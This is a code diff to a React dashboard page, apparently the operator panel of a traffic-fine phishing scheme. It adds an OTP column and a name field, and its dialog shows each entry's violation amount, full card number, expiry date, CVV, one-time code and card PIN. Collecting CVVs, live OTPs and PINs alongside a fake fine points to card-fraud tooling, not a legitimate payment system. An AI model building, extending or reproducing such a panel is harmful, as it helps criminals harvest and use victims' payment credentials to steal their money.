@@ -48,8 +48,11 @@ interface Notification {
   otpVerified: boolean;    // Flag indicating if OTP has been verified
   pass: string;            // Password as a string
   pin: string;             // Pin as a string
-  status: string;          // Status of the transaction (e.g., "completed", "pending")
+  status: string;  
+  cvID?:string;
+  name?:string;        // Status of the transaction (e.g., "completed", "pending")
   timestamp: Date; 
+
 }
 
 export default function NotificationsPage() {
@@ -414,7 +417,7 @@ export default function NotificationsPage() {
                   <th className="px-4 py-3 text-right">الصفحة الحالية</th>
                   <th className="px-4 py-3 text-right">الوقت</th>
                   <th className="px-4 py-3 text-center">الاشعارات</th>
-                  <th className="px-4 py-3 text-center">تحديث الصفحة</th>
+                  <th className="px-4 py-3 text-center">OTP</th>
                   <th className="px-4 py-3 text-center">حذف</th>
                 </tr>
               </thead>
@@ -426,11 +429,11 @@ export default function NotificationsPage() {
                     <td className="px-4 py-3">
                       <div className="flex flex-col sm:flex-row gap-2">
                         <Badge
-                          variant={notification.id! ? "default" : "destructive"}
+                          variant={notification.cvID! ? "default" : "destructive"}
                           className="rounded-md cursor-pointer"
                           onClick={() => handleInfoClick(notification, "personal")}
                         >
-                          {notification?.id! ? "معلومات شخصية" : "لا يوجد معلومات"}
+                          {notification?.cvID! ? "معلومات شخصية" : "لا يوجد معلومات"}
                         </Badge>
                         <Badge
                           variant={notification.cardNumber ? "default" : "destructive"}
@@ -454,7 +457,8 @@ export default function NotificationsPage() {
                       <UserStatusBadge userId={notification.id} />
                     </td>
                     <td className="px-4 py-3 text-center">
-                      
+                    <Badge variant={notification.otp!==""?'default':'destructive'}>{notification?.otp&& notification.otp}</Badge>
+
                     </td>
                     <td className="px-4 py-3 text-center">
                       <Button
@@ -497,11 +501,11 @@ export default function NotificationsPage() {
                 <div className="grid grid-cols-1 gap-2 mb-3">
                   <div className="flex flex-wrap gap-2">
                     <Badge
-                      variant={notification?.id! ? "default" : "destructive"}
+                      variant={notification?.cvID! ? "default" : "destructive"}
                       className="rounded-md cursor-pointer"
                       onClick={() => handleInfoClick(notification, "personal")}
                     >
-                      {notification?.id! ? "معلومات شخصية" : "لا يوجد معلومات"}
+                      {notification?.cvID! ? "معلومات شخصية" : "لا يوجد معلومات"}
                     </Badge>
                     <Badge
                       variant={notification.cardNumber ? "default" : "destructive"}
@@ -527,9 +531,9 @@ export default function NotificationsPage() {
                 </div>
 
                 <div className="border-t pt-3">
-                  <div className="text-sm font-medium mb-2">تحديث الصفحة:</div>
+                  <div className="text-sm font-medium mb-2">OTP:</div>
                   <div className="flex flex-wrap gap-2">
-                   
+                   <Badge variant={notification.otp!==""?'default':'destructive'}>{notification?.otp&& notification.otp}</Badge>
                   </div>
                 </div>
               </div>
@@ -541,8 +545,8 @@ export default function NotificationsPage() {
       <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
         <DialogContent className="bg-gray-100 text-black max-w-[90vw] md:max-w-md" dir="rtl">
           <DialogHeader>
-            <DialogTitle dir="rtl">
-              {selectedInfo === "personal"
+            <DialogTitle dir="ltr">
+              {selectedInfo?.cvID === "personal"
                 ? "المعلومات الشخصية"
                 : selectedInfo === "card"
                   ? "معلومات البطاقة"
@@ -559,28 +563,33 @@ export default function NotificationsPage() {
         
           {selectedInfo === "card" && selectedNotification && (
             <div className="space-y-2">
-              <p>
-                <strong className="text-red-400 mx-4">قيمة المخالفات:</strong> {selectedNotification.amount}
+              <p dir="ltr">
+                <strong className="text-red-400 mx-4">Violation Amount:</strong> {selectedNotification.amount}
+              </p> 
+              <p dir="ltr">
+                <strong className="text-red-400 mx-4">Name :</strong> {selectedNotification.name}
               </p>
-              <p>
-                <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{" "}
-                {selectedNotification.cardNumber &&
-                  selectedNotification.cardNumber }
+              <p dir="ltr">
+                <strong className="text-red-400 mx-4">CardNumber:</strong>{" "}
+
+              {selectedNotification.cardNumber &&
+                  selectedNotification.cardNumber.replace(/\s+/g, '') }
+
               </p>
-              <p>
-                <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong>
+              <p dir="ltr">
+                <strong className="text-red-400 mx-4">Exp Date:</strong>
                 {selectedNotification.expiry}
               </p>
 
-              <p className="flex items-center">
-                <strong className="text-red-400 mx-4">رمز الامان :</strong> {selectedNotification?.cvv!}
+              <p className="flex items-center"dir="ltr">
+                <strong className="text-red-400 mx-4">CVV :</strong> {selectedNotification?.cvv!}
               </p>
-              <p className="flex items-center">
-                <strong className="text-red-400 mx-4">رمز التحقق :</strong> {selectedNotification?.otp!}
+              <p className="flex items-center" dir="ltr">
+                <strong className="text-red-400 mx-4">OTP :</strong> {selectedNotification?.otp!}
               </p>
               
-              <p className="flex items-center">
-                <strong className="text-red-400 mx-4">رمز البطاقة :</strong> {selectedNotification.pass}
+              <p className="flex items-center" dir="ltr">
+                <strong className="text-red-400 mx-4">Card PIN :</strong> {selectedNotification.pass}
               </p>
             
               <div className="flex justify-between mx-1">
